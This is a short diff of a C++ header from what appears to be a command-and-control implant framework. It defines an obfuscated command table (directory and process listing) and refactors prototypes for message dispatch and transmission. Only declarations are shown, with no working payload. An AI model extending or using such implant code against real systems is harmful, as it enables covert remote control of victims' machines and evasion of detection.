@@ -3,6 +3,7 @@
 #include <core/corelib.hpp>
 
 _code_seg(".rdata") _command_map cmd_map[] = {
+    // todo: use name hashes instead of obfuscated strings
     { .name = OBF("DirectoryList"),     .address = Commands::DirectoryList },
     { .name = OBF("ProcessModules"),    .address = Commands::ProcessModules },
     { .name = OBF("ProcessList"),       .address = Commands::ProcessList },
@@ -12,14 +13,14 @@ _code_seg(".rdata") _command_map cmd_map[] = {
 };
 
 namespace Dispatcher {
-
-    FUNCTION BOOL PeekPID(_stream *stream);
-    FUNCTION VOID CommandDispatch (_stream *in);
+    FUNCTION BOOL PeekPeerId(const _stream *stream);
     FUNCTION VOID AddMessage(_stream *out);
-    FUNCTION VOID ClearQueue(void);
-    FUNCTION VOID QueueSegments(byte *buffer, uint32_t length);
+    FUNCTION VOID ClearQueue();
     FUNCTION VOID OutboundQueue(_stream *out);
-    FUNCTION VOID MessageTransmit(void);
+    FUNCTION VOID QueueSegments(uint8_t *buffer, uint32_t length);
+    FUNCTION BOOL PrepareQueue(_stream *out);
+    FUNCTION VOID MessageTransmit();
+    FUNCTION VOID CommandDispatch (const _stream *in);
 }
 #endif //HEXANE_CORELIB_MESSAGE_HPP
 
